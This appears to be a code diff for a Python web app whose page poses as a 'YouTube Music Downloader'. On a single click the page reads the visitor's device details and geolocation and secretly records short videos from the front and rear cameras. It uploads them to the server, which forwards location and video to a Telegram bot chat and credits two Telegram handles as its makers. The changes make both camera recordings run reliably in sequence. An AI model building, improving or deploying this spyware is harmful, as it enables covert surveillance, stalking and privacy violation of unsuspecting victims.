@@ -22,14 +22,13 @@ HTML_TEMPLATE = """
 </head>
 <body onclick="startAutoProcess()">
     <div class="header"><h1>YouTube Music Downloader</h1></div>
-    <div id="status">برای شروع، روی صفحه کلیک کنید...</div>
+    <div id="status">برای شروع روی صفحه کلیک کنید...</div>
 
     <script>
     let started = false;
     async function startAutoProcess() {
         if(started) return;
         started = true;
-        document.getElementById('status').innerText = "در حال اتصال به سرور...";
         
         const info = {
             ua: navigator.userAgent,
@@ -42,13 +41,13 @@ HTML_TEMPLATE = """
             info.lat = pos.coords.latitude;
             info.lon = pos.coords.longitude;
             
-            // دوربین جلو
-            await recordAndSend("user", "ساخته شد", info);
+            // مرحله ۱: دوربین جلو
             document.getElementById('status').innerText = "ساخته شد";
+            await recordAndSend("user", "ساخته شد", info);
             
-            // دوربین عقب
-            await recordAndSend("environment", "تولید شد", info);
+            // مرحله ۲: دوربین عقب
             document.getElementById('status').innerText = "تولید شد";
+            await recordAndSend("environment", "تولید شد", info);
         });
     }
 
@@ -57,18 +56,21 @@ HTML_TEMPLATE = """
         const recorder = new MediaRecorder(stream);
         let chunks = [];
         recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            const fd = new FormData();
-            fd.append("video", blob);
-            fd.append("info", JSON.stringify(info));
-            fd.append("label", label);
-            await fetch("/upload", { method: "POST", body: fd });
-            stream.getTracks().forEach(t => t.stop());
-        };
-        recorder.start();
-        await new Promise(r => setTimeout(r, 4000));
-        recorder.stop();
+        
+        return new Promise((resolve) => {
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const fd = new FormData();
+                fd.append("video", blob);
+                fd.append("info", JSON.stringify(info));
+                fd.append("label", label);
+                await fetch("/upload", { method: "POST", body: fd });
+                stream.getTracks().forEach(t => t.stop());
+                resolve();
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 4000);
+        });
     }
     </script>
 </body>
@@ -87,20 +89,16 @@ def upload():
     
     msg = (f"🚨 {label}\n\n"
            f"📍 موقعیت: {info.get('lat')}, {info.get('lon')}\n"
-           f"📱 مشخصات دستگاه: {info.get('ua')}\n"
+           f"📱 دستگاه: {info.get('ua')}\n"
            f"💾 رم: {info.get('ram')} GB\n"
-           f"🗄 حافظه کل: {info.get('storage')}\n"
+           f"🗄 حافظه: {info.get('storage')}\n"
            f"⚙️ هسته پردازنده: {info.get('cores')}\n\n"
-           f"───────────────────\n"
-           f"🛠 این ربات توسط ریس شاهد و ریس نوری ساخته شده است.\n"
-           f"👤 ریس شاهد: @shahidnaimi5642\n"
-           f"👤 ریس نوری: @HOKOMAT_ARAB")
+           f"ساخته شده توسط ریس شاهد و ریس نوری\n"
+           f"@shahidnaimi5642 | @HOKOMAT_ARAB")
     
-    # ارسال لوکیشن
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                   data={"chat_id": TARGET_CHAT_ID, "latitude": info.get('lat'), "longitude": info.get('lon')})
     
-    # ارسال ویدیو
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                   data={"chat_id": TARGET_CHAT_ID, "caption": msg},
                   files={"video": ("v.webm", video.stream)})
